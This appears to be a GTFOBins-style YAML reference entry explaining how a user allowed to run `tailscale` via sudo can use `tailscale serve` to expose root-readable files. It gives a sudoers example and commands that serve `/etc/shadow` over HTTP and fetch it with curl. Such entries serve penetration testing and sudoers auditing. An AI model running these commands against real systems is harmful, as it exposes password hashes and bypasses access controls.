---
description: |
  If the `tailscale` binary is allowed via `sudo`, it can be abused to read arbitrary root-readable files
  using the `serve` subcommand. This launches an HTTP server (accessible within the same Tailnet)
  that exposes the specified file without further access control.

functions:
  sudo:
    - description: |
        If the user can run `/usr/bin/tailscale` as root via `sudo`, they can serve and read any file
        accessible by root. The file becomes reachable via a Tailscale-assigned domain over HTTP.

        Example `sudoers` entry:
        ```
        ray ALL=(ALL) NOPASSWD: /usr/bin/tailscale
        ```

        Example exploitation:
        ```
        sudo tailscale serve --http=8888 /etc/shadow
        curl http://<hostname>.<tailnet>.ts.net:8888/
        ```
      code: |
        sudo tailscale serve --http=8888 /etc/shadow
        curl http://<hostname>.<tailnet>.ts.net:8888/
---
